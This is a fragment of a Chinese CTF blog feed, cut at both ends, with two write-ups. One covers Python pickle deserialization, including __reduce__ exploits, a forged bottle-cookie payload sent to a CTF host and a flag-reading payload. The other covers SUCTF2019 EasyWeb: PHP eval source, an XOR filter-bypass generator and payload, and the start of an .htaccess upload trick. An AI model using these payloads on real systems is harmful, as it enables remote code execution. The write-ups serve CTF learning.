class="hljs-keyword">x</span><span class="hljs-number">93</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>calc\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">85</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>R\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>.&#x27;<br></code></pre></td></tr></table></figure><hr><h3 id="-2"><a href="#-2" class="headerlink" title="&lt;__getstate__&gt;"></a>&lt;__getstate__&gt;</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getstate__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;序列化调用&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;calc&#x27;</span>)  <span class="hljs-comment"># 执行系统命令，打开计算器</span><br><br>a = A()<br>p_a = pickle.dumps(a)  <span class="hljs-comment"># 序列化对象a</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;===========&#x27;</span>)<br><span class="hljs-built_in">print</span>(p_a)  <span class="hljs-comment"># 打印序列化后的对象</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;弹计算机</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">序列化调用</span><br><span class="hljs-section">===========</span><br>b&#x27;\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08<span class="hljs-emphasis">__main__</span>\x94\x8c\x01A\x94\x93\x94)\x81\x94.<span class="hljs-emphasis">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先构造exp</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Demo</span>(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">    def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        shell = &#x27;calc&#x27;</span><br><span class="hljs-class">        return (<span class="hljs-title">os</span>.<span class="hljs-title">system</span>,(<span class="hljs-title">shell</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">demo = <span class="hljs-type">Demo</span>()</span><br><span class="hljs-class">pickle.loads(<span class="hljs-title">pickle</span>.<span class="hljs-title">dumps</span>(<span class="hljs-title">demo</span>))</span><br></code></pre></td></tr></table></figure><p>然后根据题目的要求比如base64编码之类的对payload进行处理，然后传入即可。</p><h4 id="例题：signning"><a href="#例题：signning" class="headerlink" title="例题：signning"></a>例题：signning</h4><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os  <br><span class="hljs-keyword">import</span> requests  <br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode  <br><span class="hljs-keyword">import</span> warnings  <br><br><span class="hljs-comment"># 忽略特定警告  </span><br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>, category=DeprecationWarning)  <br><br><span class="hljs-comment"># 自定义 secret  </span><br>secret = <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span>  <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:  <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):  <br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./2.txt&#x27;)&quot;&quot;&quot;</span>,))  <br><br><span class="hljs-comment"># 使用 cookie_encode 编码  </span><br>exp = cookie_encode(  <br>    (<span class="hljs-string">&#x27;session&#x27;</span>, &#123;<span class="hljs-string">&quot;name&quot;</span>: [Test()]&#125;),  <br>    secret  <br>)  <br><br><span class="hljs-comment"># 发起 GET 请求并传递 cookie  </span><br>response = requests.get(<span class="hljs-string">&#x27;http://gz.imxbt.cn:20805/secret&#x27;</span>, cookies=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: exp.decode()&#125;)<br></code></pre></td></tr></table></figure><h4 id="例题：ikun"><a href="#例题：ikun" class="headerlink" title="例题：ikun"></a>例题：ikun</h4><p>在这题的源码中能看到调用序列化的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@tornado.web.authenticated</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self,*args,**kwargs</span>)<br><span class="hljs-keyword">try</span>:<br>become = <span class="hljs-variable language_">self</span>.get_argument(<span class="hljs-string">&#x27;become&#x27;</span>)<br>p = pickle.loads(urllib.unquote(become))<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;form.html&#x27;</span>,res=p,member=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.render(<span class="hljs-string">&#x27;form.html&#x27;</span>,res=<span class="hljs-string">&#x27;This is Black&#x27;</span>)<br></code></pre></td></tr></table></figure><p>经过分析得知其是python2进行编码的，因此我们使用python构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span>(<span class="hljs-title class_ inherited__">object</span>):<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span>,))<br>a = pickle.dumps(payload())<br>a = urllib.quote(a)<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><p>执行后可以看到成功构造了payload。</p><p>将value的值改成我们刚刚生成的payload</p><p>更改后再次点击一键成为大会员，可以看到成功获取到了flag。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-EasyWeb</title>
      <link href="/2025/04/14/SUCTF2019-EasyWeb/"/>
      <url>/2025/04/14/SUCTF2019-EasyWeb/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF2019-EasyWeb"><a href="#SUCTF2019-EasyWeb" class="headerlink" title="SUCTF2019-EasyWeb"></a>SUCTF2019-EasyWeb</h1><p><a href="https://fumx1314.github.io/2025/04/08/%5BSUCTF%202019%5DEasyWeb/">借鉴大佬博客</a></p><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$userdir</span>))&#123;<br><span class="hljs-built_in">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>创建基于IP MD5哈希值的唯一上传目录</p><p>目录格式：upload&#x2F;tmp_[用户IP的MD5]</p><hr><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>      <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>      <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>      <span class="hljs-variable">$extension</span> = <span class="hljs-keyword">substr</span>(<span class="hljs-variable">$name</span>, strrpos(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>检查是否有文件上传</p><p>获取上传文件的临时路径、原始文件名和扩展名</p><hr><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,$extension)) die(<span class="hljs-string">&quot;^_^&quot;</span>)<span class="hljs-comment">; </span><br>      if(<span class="hljs-name">mb_strpos</span>(<span class="hljs-name">file_get_contents</span>($tmp_name), &#x27;&lt;?&#x27;)!==False) die(<span class="hljs-string">&quot;^_^&quot;</span>)<span class="hljs-comment">;</span><br>  if(!exif_imagetype($tmp_name)) die(<span class="hljs-string">&quot;^_^&quot;</span>)<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>安全限制：</p><p>禁止包含ph的扩展名</p><p>内容过滤：检查文件内容是否包含php起始标记&lt;?</p><p>图像验证：使用exif_imagetype()验证是否为有效图像文件</p><hr><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$path= $userdir.<span class="hljs-string">&quot;/&quot;</span>.$name<span class="hljs-comment">;</span><br><span class="hljs-symbol">@move_uploaded_file</span>($tmp_name, $path)<span class="hljs-comment">;</span><br>print_r($path)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>将文件上传到专属目录</p><p>输出文件保存路径</p><hr><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    highlight_file(<span class="hljs-variable constant_">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>获取?_&#x3D;参数值，无参数时显示源码</p><hr><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">if</span>(strlen($hhh)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-built_in">die</span>(&#x27;One inch long, one inch strong!&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure><p>限制参数值为18个字符</p><hr><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> ( preg_match(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br></code></pre></td></tr></table></figure><p>字符过滤</p><p>禁止使用：控制字符(\x00-\x1F)、空格、数字0-9、大小写字母、特殊字符</p><hr><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$character_type</span> = count_chars(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br></code></pre></td></tr></table></figure><p>count_char($hhh,3)返回参数中使用的唯一字符</p><p>限制最多使用12中不同字符</p><hr><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>($hhh)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>危险函数</p><hr><h2 id="异或运算构造-GET"><a href="#异或运算构造-GET" class="headerlink" title="异或运算构造$_GET{};"></a>异或运算构造$_GET{};</h2><p>我们可以使用异或绕过来构造<code>$_GET[]();的格式来调用get_the_flag</code>函数</p><p>异或生成脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finds</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$a</span>=[<span class="hljs-number">33</span>,<span class="hljs-number">35</span>,<span class="hljs-number">36</span>,<span class="hljs-number">37</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>,<span class="hljs-number">42</span>,<span class="hljs-number">43</span>,<span class="hljs-number">45</span>,<span class="hljs-number">47</span>,<span class="hljs-number">58</span>,<span class="hljs-number">59</span>,<span class="hljs-number">60</span>,<span class="hljs-number">62</span>,<span class="hljs-number">63</span>,<span class="hljs-number">64</span>,<span class="hljs-number">92</span>,<span class="hljs-number">93</span>,<span class="hljs-number">94</span>,<span class="hljs-number">123</span>,<span class="hljs-number">125</span>,<span class="hljs-number">128</span>,<span class="hljs-number">129</span>,<span class="hljs-number">130</span>,<span class="hljs-number">131</span>,<span class="hljs-number">132</span>,<span class="hljs-number">133</span>,<span class="hljs-number">134</span>,<span class="hljs-number">135</span>,<span class="hljs-number">136</span>,<span class="hljs-number">137</span>,<span class="hljs-number">138</span>,<span class="hljs-number">139</span>,<span class="hljs-number">140</span>,<span class="hljs-number">141</span>,<span class="hljs-number">142</span>,<span class="hljs-number">143</span>,<span class="hljs-number">144</span>,<span class="hljs-number">145</span>,<span class="hljs-number">146</span>,<span class="hljs-number">147</span>,<span class="hljs-number">148</span>,<span class="hljs-number">149</span>,<span class="hljs-number">150</span>,<span class="hljs-number">151</span>,<span class="hljs-number">152</span>,<span class="hljs-number">153</span>,<span class="hljs-number">154</span>,<span class="hljs-number">155</span>,<span class="hljs-number">156</span>,<span class="hljs-number">157</span>,<span class="hljs-number">158</span>,<span class="hljs-number">159</span>,<span class="hljs-number">160</span>,<span class="hljs-number">161</span>,<span class="hljs-number">162</span>,<span class="hljs-number">163</span>,<span class="hljs-number">164</span>,<span class="hljs-number">165</span>,<span class="hljs-number">166</span>,<span class="hljs-number">167</span>,<span class="hljs-number">168</span>,<span class="hljs-number">169</span>,<span class="hljs-number">170</span>,<span class="hljs-number">171</span>,<span class="hljs-number">172</span>,<span class="hljs-number">173</span>,<span class="hljs-number">174</span>,<span class="hljs-number">175</span>,<span class="hljs-number">176</span>,<span class="hljs-number">177</span>,<span class="hljs-number">178</span>,<span class="hljs-number">179</span>,<span class="hljs-number">180</span>,<span class="hljs-number">181</span>,<span class="hljs-number">182</span>,<span class="hljs-number">183</span>,<span class="hljs-number">184</span>,<span class="hljs-number">185</span>,<span class="hljs-number">186</span>,<span class="hljs-number">187</span>,<span class="hljs-number">188</span>,<span class="hljs-number">189</span>,<span class="hljs-number">190</span>,<span class="hljs-number">191</span>,<span class="hljs-number">192</span>,<span class="hljs-number">193</span>,<span class="hljs-number">194</span>,<span class="hljs-number">195</span>,<span class="hljs-number">196</span>,<span class="hljs-number">197</span>,<span class="hljs-number">198</span>,<span class="hljs-number">199</span>,<span class="hljs-number">200</span>,<span class="hljs-number">201</span>,<span class="hljs-number">202</span>,<span class="hljs-number">203</span>,<span class="hljs-number">204</span>,<span class="hljs-number">205</span>,<span class="hljs-number">206</span>,<span class="hljs-number">207</span>,<span class="hljs-number">208</span>,<span class="hljs-number">209</span>,<span class="hljs-number">210</span>,<span class="hljs-number">211</span>,<span class="hljs-number">212</span>,<span class="hljs-number">213</span>,<span class="hljs-number">214</span>,<span class="hljs-number">215</span>,<span class="hljs-number">216</span>,<span class="hljs-number">217</span>,<span class="hljs-number">218</span>,<span class="hljs-number">219</span>,<span class="hljs-number">220</span>,<span class="hljs-number">221</span>,<span class="hljs-number">222</span>,<span class="hljs-number">223</span>,<span class="hljs-number">224</span>,<span class="hljs-number">225</span>,<span class="hljs-number">226</span>,<span class="hljs-number">227</span>,<span class="hljs-number">228</span>,<span class="hljs-number">229</span>,<span class="hljs-number">230</span>,<span class="hljs-number">231</span>,<span class="hljs-number">232</span>,<span class="hljs-number">233</span>,<span class="hljs-number">234</span>,<span class="hljs-number">235</span>,<span class="hljs-number">236</span>,<span class="hljs-number">237</span>,<span class="hljs-number">238</span>,<span class="hljs-number">239</span>,<span class="hljs-number">240</span>,<span class="hljs-number">241</span>,<span class="hljs-number">242</span>,<span class="hljs-number">243</span>,<span class="hljs-number">244</span>,<span class="hljs-number">245</span>,<span class="hljs-number">246</span>,<span class="hljs-number">247</span>,<span class="hljs-number">248</span>,<span class="hljs-number">249</span>,<span class="hljs-number">250</span>,<span class="hljs-number">251</span>,<span class="hljs-number">252</span>,<span class="hljs-number">253</span>,<span class="hljs-number">254</span>,<span class="hljs-number">255</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">27</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">27</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$x</span> = <span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-variable">$j</span>];<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>);<span class="hljs-variable">$k</span>++)&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>]) == <span class="hljs-variable">$x</span>)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;%&#x27;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>]) . <span class="hljs-string">&#x27;^%&#x27;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$a</span>[<span class="hljs-variable">$j</span>]).<span class="hljs-string">&quot;\n&quot;</span>;<br>                    <span class="hljs-variable">$index</span>++;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$index</span> == <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$string</span>))&#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">finds</span>(<span class="hljs-string">&quot;_GET&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=phpinfo<br><br><br><br>?_=...    $_GET[<span class="hljs-string">&#x27;_&#x27;</span>] = ...    主注入点，触发动态函数调用<br>%80%80%80%80^%df%c7%c5%d4    异或运算生成关键字符串    动态构造 _GET<br>&#123;%80&#125;    $_GET[<span class="hljs-string">&#x27;%80&#x27;</span>]    提取参数值作为函数名<br>&amp;%80=phpinfo    $_GET[<span class="hljs-string">&#x27;%80&#x27;</span>] = <span class="hljs-string">&#x27;phpinfo&#x27;</span>    注入要执行的函数名<br></code></pre></td></tr></table></figure><h2 id="htaccess上传"><a href="#htaccess上传" class="headerlink" title=".htaccess上传"></a>.htaccess上传</h2><p>如果像之前一样在文件前面加个GIF89A是不行的，会有500响应码</p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> width 1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> height 1337</span><br></code></pre></td></tr></table></figure><p>可能是为了绕过某些 WAF 的规则检测。</p><h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">在.htaccess前添加<span class="hljs-keyword">x</span><span 